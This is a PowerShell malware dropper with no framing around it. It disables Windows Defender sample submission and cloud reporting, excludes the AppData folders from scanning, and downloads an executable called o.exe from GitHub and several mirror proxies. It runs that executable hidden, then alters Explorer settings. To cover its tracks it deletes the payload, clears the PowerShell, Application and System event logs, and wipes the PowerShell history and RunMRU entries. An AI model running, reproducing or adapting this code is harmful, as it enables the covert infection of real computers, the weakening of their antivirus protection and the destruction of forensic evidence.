$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) { exit }

Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

Add-MpPreference -ExclusionPath ([System.Environment]::GetFolderPath("ApplicationData"))
Add-MpPreference -ExclusionPath ([System.Environment]::GetFolderPath("LocalApplicationData"))

$urls = @(
    "https://github.com/nhofx/o/blob/sellaz/o.exe?raw=true",
    "https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://ghproxy.net/https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://gh-proxy.com/https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://ghfast.top/https://raw.githubusercontent.com/nhofx/o/sellaz/o.exe",
    "https://cdn.jsdelivr.net/gh/nhofx/o@sellaz/o.exe",
    "https://gitcdn.link/repo/nhofx/o/sellaz/o.exe",
    "https://raw.gitmirror.com/nhofx/o/sellaz/o.exe"
)

$moduleExe = "$env:TEMP\o.exe"
foreach ($u in $urls) {
    try {
        Invoke-WebRequest -Uri $u -OutFile $moduleExe -UseBasicParsing -ErrorAction Stop
        if (Test-Path $moduleExe) { break }
    } catch {}
}

$started = $false
if (Test-Path $moduleExe) {
    Start-Process -FilePath $moduleExe -WindowStyle Hidden
    Start-Sleep -Seconds 2
    $started = $true
}

if ($started) {
    try {
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "ShowSuperHidden" -Value 1 -Type DWord -Force
        $sig2 = @"
using System;
using System.Runtime.InteropServices;
public class Exp {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr SendMessageTimeout(IntPtr h, uint m, IntPtr w, string l, uint f, uint t, out IntPtr r);
}
"@
        Add-Type -TypeDefinition $sig2 -ErrorAction SilentlyContinue
        [Exp]::SendMessageTimeout([IntPtr]0xffff, 0x001A, [IntPtr]::Zero, "ShellState", 2, 5000, [ref]([IntPtr]::Zero)) | Out-Null
    } catch {}

    Start-Sleep -Seconds 1

    Remove-Item -Path $moduleExe -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:TEMP\a.ps1" -Force -ErrorAction SilentlyContinue

    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    wevtutil cl "Application" 2>$null
    wevtutil cl "System" 2>$null

    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue

    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
}